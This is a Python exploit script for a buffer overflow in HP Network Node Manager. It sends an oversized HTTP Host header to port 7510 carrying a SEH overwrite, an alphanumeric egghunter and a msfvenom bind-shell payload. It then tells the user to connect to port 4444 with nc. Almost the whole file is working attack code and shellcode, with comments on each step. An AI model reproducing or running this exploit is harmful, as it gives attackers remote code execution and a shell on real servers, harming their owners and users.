#!/usr/bin/python

import socket
import os
import sys
from struct import pack

host = ""
port = 7510

### Use struct.pack to handle sending bytes in right order ###
ret = pack("<L", 0x5A413229) 		# POP POP RET in ovutil.dll 0x5A413229

### DEC ESP twice to set CF and ZF flags to 0 so JA triggers ###
firstJump = "\x4c\x4c\x77\x04" 		# DEC ESP, DEC ESP, JA 04

### Zero out EAX ###
setStack = "\x25\x4A\x4D\x4E\x55" 	# AND EAX, 0x554E4D4A
setStack += "\x25\x35\x32\x31\x2A" 	# AND EAX, 0x2A313235
### Save ESP to EAX ###
setStack += "\x54\x58" 			# PUSH ESP, POP EAX
### Underflow ESP to desired value ###
setStack += "\x2D\x35\x65\x55\x55" 	# SUB EAX, 0x55556535
setStack += "\x2D\x35\x65\x55\x55" 	# SUB EAX, 0x55556535
setStack += "\x2D\x0C\x18\x54\x55" 	# SUB EAX, 0x5554180C
setStack += "\x50\x5C" 			# PUSH EAX, POP ESP

### Egg is w00t ###
egghunter = ""
egghunter += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x41\x09\x50\x09"
egghunter += "\x2D\x41\x09\x50\x09\x2D\x09\x06\x60\x05\x50\x25\x4A\x4D\x4E"
egghunter += "\x55\x25\x35\x32\x31\x2A\x2D\x25\x39\x07\x25\x2D\x25\x39\x07"
egghunter += "\x25\x2D\x07\x18\x07\x06\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32"
egghunter += "\x31\x2A\x2D\x39\x39\x35\x02\x2D\x39\x38\x34\x02\x2D\x5E\x1A"
egghunter += "\x0B\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x05"
egghunter += "\x20\x39\x51\x2D\x05\x20\x39\x51\x2D\x07\x07\x16\x2D\x50\x25"
egghunter += "\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x50\x50\x50\x45\x2D"
egghunter += "\x50\x50\x50\x45\x2D\x24\x5A\x05\x01\x50\x25\x4A\x4D\x4E\x55"
egghunter += "\x25\x35\x32\x31\x2A\x2D\x50\x45\x15\x55\x2D\x50\x45\x15\x55"
egghunter += "\x2D\x5E\x1D\x08\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
egghunter += "\x2A\x2D\x55\x55\x45\x41\x2D\x55\x55\x45\x41\x2D\x47\x13\x23"
egghunter += "\x13\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x45\x35"
egghunter += "\x15\x55\x2D\x45\x35\x15\x55\x2D\x10\x14\x0B\x56\x50"

# msfvenom -p windows/shell_bind_tcp LPORT:4444 -e x86/alpha_mixed -b "\x00, \x0a, \x0d, \x2f, \x3a, \x3f, \x40" EXITFUNC=thread -f python #
# Payload size: 718 bytes #
buf =  ""
buf += "\x89\xe1\xdb\xc2\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x59\x78\x4f"
buf += "\x72\x77\x70\x55\x50\x75\x50\x75\x30\x6e\x69\x39\x75"
buf += "\x65\x61\x6b\x70\x62\x44\x6e\x6b\x70\x50\x50\x30\x4c"
buf += "\x4b\x70\x52\x54\x4c\x6c\x4b\x50\x52\x67\x64\x6c\x4b"
buf += "\x30\x72\x45\x78\x64\x4f\x48\x37\x33\x7a\x74\x66\x76"
buf += "\x51\x69\x6f\x4c\x6c\x65\x6c\x63\x51\x33\x4c\x55\x52"
buf += "\x56\x4c\x61\x30\x59\x51\x6a\x6f\x56\x6d\x37\x71\x79"
buf += "\x57\x68\x62\x78\x72\x73\x62\x53\x67\x6e\x6b\x73\x62"
buf += "\x66\x70\x4e\x6b\x31\x5a\x65\x6c\x4c\x4b\x72\x6c\x57"
buf += "\x61\x44\x38\x58\x63\x42\x68\x56\x61\x4e\x31\x70\x51"
buf += "\x4c\x4b\x72\x79\x67\x50\x37\x71\x78\x53\x4c\x4b\x77"
buf += "\x39\x72\x38\x4d\x33\x46\x5a\x70\x49\x4c\x4b\x66\x54"
buf += "\x6c\x4b\x67\x71\x7a\x76\x34\x71\x69\x6f\x4c\x6c\x49"
buf += "\x51\x48\x4f\x36\x6d\x53\x31\x6b\x77\x70\x38\x79\x70"
buf += "\x52\x55\x38\x76\x35\x53\x43\x4d\x39\x68\x47\x4b\x71"
buf += "\x6d\x45\x74\x34\x35\x58\x64\x50\x58\x6e\x6b\x70\x58"
buf += "\x44\x64\x76\x61\x39\x43\x43\x56\x6e\x6b\x54\x4c\x62"
buf += "\x6b\x6c\x4b\x53\x68\x45\x4c\x65\x51\x38\x53\x6e\x6b"
buf += "\x55\x54\x6e\x6b\x55\x51\x4a\x70\x4f\x79\x71\x54\x57"
buf += "\x54\x56\x44\x71\x4b\x43\x6b\x50\x61\x73\x69\x31\x4a"
buf += "\x52\x71\x6b\x4f\x59\x70\x53\x6f\x61\x4f\x31\x4a\x4c"
buf += "\x4b\x54\x52\x7a\x4b\x6c\x4d\x61\x4d\x73\x58\x54\x73"
buf += "\x47\x42\x35\x50\x35\x50\x53\x58\x52\x57\x74\x33\x67"
buf += "\x42\x33\x6f\x36\x34\x50\x68\x72\x6c\x52\x57\x77\x56"
buf += "\x33\x37\x79\x6f\x59\x45\x78\x38\x4a\x30\x33\x31\x57"
buf += "\x70\x35\x50\x54\x69\x48\x44\x31\x44\x36\x30\x53\x58"
buf += "\x57\x59\x6b\x30\x72\x4b\x55\x50\x6b\x4f\x59\x45\x73"
buf += "\x5a\x36\x68\x62\x79\x30\x50\x7a\x42\x39\x6d\x43\x70"
buf += "\x66\x30\x77\x30\x56\x30\x31\x78\x69\x7a\x66\x6f\x6b"
buf += "\x6f\x6d\x30\x6b\x4f\x4b\x65\x6c\x57\x70\x68\x63\x32"
buf += "\x43\x30\x57\x61\x33\x6c\x6f\x79\x5a\x46\x30\x6a\x56"
buf += "\x70\x32\x76\x43\x67\x45\x38\x39\x52\x69\x4b\x57\x47"
buf += "\x73\x57\x69\x6f\x6e\x35\x62\x77\x53\x58\x38\x37\x4a"
buf += "\x49\x54\x78\x4b\x4f\x69\x6f\x5a\x75\x70\x57\x72\x48"
buf += "\x43\x44\x6a\x4c\x65\x6b\x69\x71\x6b\x4f\x48\x55\x63"
buf += "\x67\x6a\x37\x50\x68\x33\x45\x52\x4e\x32\x6d\x53\x51"
buf += "\x59\x6f\x4a\x75\x73\x58\x52\x43\x32\x4d\x51\x74\x65"
buf += "\x50\x6b\x39\x4b\x53\x31\x47\x56\x37\x62\x77\x35\x61"
buf += "\x58\x76\x61\x7a\x74\x52\x30\x59\x33\x66\x58\x62\x69"
buf += "\x6d\x73\x56\x5a\x67\x42\x64\x44\x64\x75\x6c\x67\x71"
buf += "\x35\x51\x4e\x6d\x43\x74\x34\x64\x72\x30\x78\x46\x67"
buf += "\x70\x67\x34\x56\x34\x62\x70\x46\x36\x31\x46\x72\x76"
buf += "\x63\x76\x76\x36\x32\x6e\x72\x76\x61\x46\x51\x43\x36"
buf += "\x36\x33\x58\x33\x49\x68\x4c\x45\x6f\x4f\x76\x59\x6f"
buf += "\x38\x55\x6f\x79\x4d\x30\x52\x6e\x46\x36\x33\x76\x59"
buf += "\x6f\x46\x50\x71\x78\x35\x58\x4b\x37\x55\x4d\x33\x50"
buf += "\x4b\x4f\x59\x45\x6d\x6b\x59\x70\x37\x6d\x55\x7a\x67"
buf += "\x7a\x61\x78\x6d\x76\x4a\x35\x4d\x6d\x6f\x6d\x79\x6f"
buf += "\x49\x45\x35\x6c\x37\x76\x63\x4c\x67\x7a\x4d\x50\x49"
buf += "\x6b\x39\x70\x71\x65\x75\x55\x4d\x6b\x42\x67\x72\x33"
buf += "\x73\x42\x52\x4f\x71\x7a\x43\x30\x66\x33\x39\x6f\x49"
buf += "\x45\x41\x41"

### Final stage payload comprised of the egg, nops, a final
### stack align, and the shellcode.
# \x83\xc4\x04 = ADD ESP, 0x04 #
payload = "w00tw00t" + "\x90" * 30 + "\x83\xc4\x04" + buf

crash =  "A" * (3381 - len(firstJump))
crash += firstJump
crash += ret
crash += setStack
crash += egghunter
crash += "C" * (4000 - len(crash))

buffer = "GET /topology/home HTTP/1.1\r\n"
buffer += "Host: " + crash + "\r\n"
buffer += "Content-Type: applicaton/x-www-form-urlencoded\r\n"
buffer += "User-Agent: \r\n"
buffer += "Content-Length: 1048580\r\n\r\n"
buffer += payload


print "[*] Sending evil HTTP request to HP NNM\r\n"
print "[*] Crash takes a few seconds to occur\r\n"
print "[*] After 45 seconds, attempt to connect with:\r\n"
print "[*] nc -nv " + host + " 4444\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()
